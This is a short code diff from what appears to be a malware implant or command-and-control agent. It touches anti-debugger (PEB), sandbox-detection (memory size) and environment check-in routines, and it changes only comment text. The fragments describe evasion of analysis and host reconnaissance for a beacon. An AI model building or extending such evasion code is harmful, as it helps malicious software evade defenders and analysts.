@@ -37,7 +37,7 @@ namespace Opsec {
     }
 
     BOOL CheckDebugger() {
-        // todo: diagnose why this stopped working
+        // TODO: diagnose why this stopped working
 
         PPEB peb    = PEB_POINTER;
         BOOL m_x32  = FALSE;
@@ -66,7 +66,7 @@ namespace Opsec {
     }
 
     BOOL CheckSandbox() {
-        // todo: check ACPI tables for vm vendors instead of just checking memory
+        // TODO: check ACPI tables for vm vendors instead of just checking memory
 
         MEMORYSTATUSEX stats = { };
         stats.dwLength = sizeof(stats);
@@ -76,7 +76,7 @@ namespace Opsec {
     }
 
     BOOL CheckEnvironment() {
-        // todo: add more information to the checkin message
+        // TODO: add more information to the checkin message (ETW-TI maybe)
 
         _stream *out            = CreateStreamWithHeaders(TypeCheckin);
         IP_ADAPTER_INFO adapter = { };
